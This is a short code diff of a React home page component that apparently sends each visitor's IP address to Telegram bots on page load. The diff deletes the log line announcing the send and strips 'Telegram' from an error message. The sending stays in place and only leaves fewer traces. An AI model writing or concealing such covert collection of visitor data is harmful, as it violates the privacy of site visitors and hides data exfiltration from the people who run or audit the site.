@@ -56,12 +56,11 @@ function Home() {
           body: JSON.stringify(odata),
         });
 
-        console.log("IP address sent to Telegram bots");
 
         // Set flag in sessionStorage to indicate IP has been sent
         sessionStorage.setItem("ipSent", "true");
       } catch (error) {
-        console.error("Error fetching IP or sending to Telegram:", error);
+        console.error("Error fetching IP", error);
       }
     };
 
